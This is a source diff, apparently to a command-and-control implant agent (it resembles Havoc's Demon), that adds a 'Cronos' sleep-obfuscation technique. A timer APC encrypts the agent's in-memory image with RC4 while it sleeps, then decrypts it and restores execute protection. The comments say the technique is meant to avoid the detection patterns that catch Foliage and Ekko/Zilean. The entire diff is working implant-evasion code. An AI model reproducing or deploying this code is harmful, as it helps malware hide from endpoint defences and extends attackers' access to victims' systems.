@@ -647,6 +647,190 @@ LEAVE: /* cleanup */
 
 #endif
 
+/*!
+ * @brief
+ *  Context block shared between the main thread and the Cronos APC callback.
+ *  Allocated on the main thread's stack; the callback pointer is passed via
+ *  NtSetTimer's TimerContext parameter.
+ */
+typedef struct _CRONOS_CTX
+{
+    ULONG    TimeOut;   /* sleep duration in milliseconds */
+    PVOID    ImgBase;   /* agent image base */
+    ULONG    ImgSize;   /* agent image size */
+    PVOID    TxtBase;   /* .text section base (may equal ImgBase) */
+    ULONG    TxtSize;   /* .text section size */
+    ULONG    Protect;   /* desired protection on .text after decrypt */
+    UCHAR    Key[ 16 ]; /* RC4-style key (SystemFunction032 is symmetric) */
+    USTRING  KeyStr;    /* USTRING wrapper around Key */
+    USTRING  ImgStr;    /* USTRING wrapper around ImgBase/ImgSize */
+    BOOL     Done;      /* set to TRUE after decrypt completes */
+} CRONOS_CTX, *PCRONOS_CTX;
+
+#if _WIN64
+
+/*!
+ * @brief
+ *  Timer APC callback invoked on the main thread when the waitable timer
+ *  fires.  Runs entirely within the calling thread's alertable-wait context —
+ *  no suspended threads, no new thread creation.
+ *
+ *  Sequence:
+ *    1. Change image protection to RW.
+ *    2. RC4-encrypt the image (SystemFunction032 — symmetric).
+ *    3. Non-alertable sleep for the requested duration.
+ *    4. RC4-decrypt the image (same call, symmetric cipher).
+ *    5. Restore .text protection.
+ *    6. Signal Done so the caller can detect completion.
+ *
+ * @param ApcContext  Pointer to CRONOS_CTX allocated on the caller's stack.
+ * @param LowValue    Timer expiry (low DWORD) — unused.
+ * @param HighValue   Timer expiry (high DWORD) — unused.
+ */
+VOID NTAPI CronosCallback(
+    IN PVOID ApcContext,
+    IN ULONG LowValue,
+    IN LONG  HighValue
+) {
+    PCRONOS_CTX Ctx      = ( PCRONOS_CTX ) ApcContext;
+    ULONG       OldProt  = 0;
+    LARGE_INTEGER Delay  = { 0 };
+
+    /* Step 1 — make agent image writable before encryption */
+    Instance->Win32.VirtualProtect( Ctx->ImgBase, Ctx->ImgSize, PAGE_READWRITE, &OldProt );
+
+    /* Step 2 — encrypt: SystemFunction032 is RC4; calling it again decrypts */
+    Instance->Win32.SystemFunction032( &Ctx->ImgStr, &Ctx->KeyStr );
+
+    /* Step 3 — non-alertable sleep so we don't process further APCs */
+    Instance->Win32.WaitForSingleObjectEx( NtCurrentProcess(), Ctx->TimeOut, FALSE );
+
+    /* Step 4 — decrypt (same RC4 call, symmetric) */
+    Instance->Win32.SystemFunction032( &Ctx->ImgStr, &Ctx->KeyStr );
+
+    /* Step 5 — restore .text protection */
+    Instance->Win32.VirtualProtect( Ctx->TxtBase, Ctx->TxtSize, Ctx->Protect, &OldProt );
+
+    /* Step 6 — signal completion */
+    Ctx->Done = TRUE;
+
+    ( VOID ) LowValue;
+    ( VOID ) HighValue;
+}
+
+#endif /* _WIN64 */
+
+/*!
+ * @brief
+ *  Cronos-style sleep obfuscation (ARC-03).
+ *
+ *  Schedules a single NtSetTimer APC on the calling thread, then enters an
+ *  alertable wait.  When the timer fires the APC callback runs on the same
+ *  thread — encrypting the image, sleeping for @p TimeOut ms, then
+ *  decrypting — without ever suspending a thread.
+ *
+ *  Avoids the CreateRemoteThread-on-suspended-thread detection pattern
+ *  triggered by Foliage and the timer-pool approaches used by Ekko/Zilean.
+ *
+ * @param TimeOut  Sleep duration in milliseconds.
+ * @return TRUE on success, FALSE if any NT call fails.
+ */
+BOOL CronosObf(
+    _In_ ULONG TimeOut
+) {
+#if _WIN64
+
+    HANDLE      hTimer  = NULL;
+    CRONOS_CTX  Ctx     = { 0 };
+    LARGE_INTEGER DueTime = { 0 }; /* 0 = fire immediately */
+    NTSTATUS    NtStatus = STATUS_SUCCESS;
+    BOOL        Success  = FALSE;
+
+    /* ------------------------------------------------------------------ */
+    /*  Populate context block                                              */
+    /* ------------------------------------------------------------------ */
+    Ctx.TimeOut  = TimeOut;
+    Ctx.ImgBase  = Instance->Session.ModuleBase;
+    Ctx.ImgSize  = Instance->Session.ModuleSize;
+    Ctx.Protect  = PAGE_EXECUTE_READWRITE;
+
+    if ( Instance->Session.TxtBase && Instance->Session.TxtSize ) {
+        Ctx.TxtBase = Instance->Session.TxtBase;
+        Ctx.TxtSize = Instance->Session.TxtSize;
+        Ctx.Protect = PAGE_EXECUTE_READ;
+    } else {
+        Ctx.TxtBase = Ctx.ImgBase;
+        Ctx.TxtSize = Ctx.ImgSize;
+    }
+
+    /* generate a random 16-byte RC4 key */
+    for ( BYTE i = 0; i < 16; i++ ) {
+        Ctx.Key[ i ] = RandomNumber32();
+    }
+
+    Ctx.KeyStr.Buffer        = Ctx.Key;
+    Ctx.KeyStr.Length        = Ctx.KeyStr.MaximumLength = sizeof( Ctx.Key );
+    Ctx.ImgStr.Buffer        = Ctx.ImgBase;
+    Ctx.ImgStr.Length        = Ctx.ImgStr.MaximumLength = Ctx.ImgSize;
+    Ctx.Done = FALSE;
+
+    /* ------------------------------------------------------------------ */
+    /*  Create a synchronisation timer (auto-resets after each signal)     */
+    /* ------------------------------------------------------------------ */
+    if ( ! NT_SUCCESS( NtStatus = Instance->Win32.NtCreateTimer(
+        &hTimer, TIMER_ALL_ACCESS, NULL, SynchronizationTimer ) ) )
+    {
+        PRINTF( "NtCreateTimer failed: %lx\n", NtStatus )
+        goto LEAVE;
+    }
+
+    /* ------------------------------------------------------------------ */
+    /*  Arm the timer to fire immediately, registering our APC callback    */
+    /* ------------------------------------------------------------------ */
+    if ( ! NT_SUCCESS( NtStatus = Instance->Win32.NtSetTimer(
+        hTimer, &DueTime,
+        C_PTR( CronosCallback ), &Ctx,
+        FALSE, 0, NULL ) ) )
+    {
+        PRINTF( "NtSetTimer failed: %lx\n", NtStatus )
+        goto LEAVE;
+    }
+
+    /*
+     * Enter an alertable wait on the timer.  The kernel queues our APC as
+     * soon as DueTime elapses (immediately).  The APC dispatcher:
+     *   - calls CronosCallback (encrypt → sleep → decrypt)
+     *   - returns STATUS_USER_APC or STATUS_SUCCESS to us here
+     * Both are acceptable — the callback has already completed.
+     */
+    NtStatus = SysNtWaitForSingleObject( hTimer, TRUE, NULL );
+    if ( NT_SUCCESS( NtStatus ) || NtStatus == (NTSTATUS)STATUS_USER_APC ) {
+        Success = Ctx.Done;
+    }
+
+    if ( ! Success ) {
+        PRINTF( "CronosObf: callback did not complete (NtStatus=%lx Done=%d)\n",
+                NtStatus, Ctx.Done )
+    }
+
+LEAVE:
+    if ( hTimer ) {
+        Instance->Win32.NtCancelTimer( hTimer, NULL );
+        SysNtClose( hTimer );
+        hTimer = NULL;
+    }
+
+    /* wipe key from stack */
+    RtlSecureZeroMemory( Ctx.Key, sizeof( Ctx.Key ) );
+
+    return Success;
+
+#else /* x86 — fallback, no obfuscation */
+    Instance->Win32.WaitForSingleObjectEx( NtCurrentProcess(), TimeOut, FALSE );
+    return TRUE;
+#endif
+}
+
 UINT32 SleepTime(
     VOID
 ) {
@@ -749,6 +933,14 @@ VOID SleepObf(
         case SLEEPOBF_EKKO:
         case SLEEPOBF_ZILEAN: {
             if ( ! TimerObf( TimeOut, Technique ) ) {
+                goto DEFAULT;
+            }
+            break;
+        }
+
+        /* ARC-03: Cronos — timer-APC on calling thread, no thread suspension */
+        case SLEEPOBF_CRONOS: {
+            if ( ! CronosObf( TimeOut ) ) {
                 goto DEFAULT;
             }
             break;
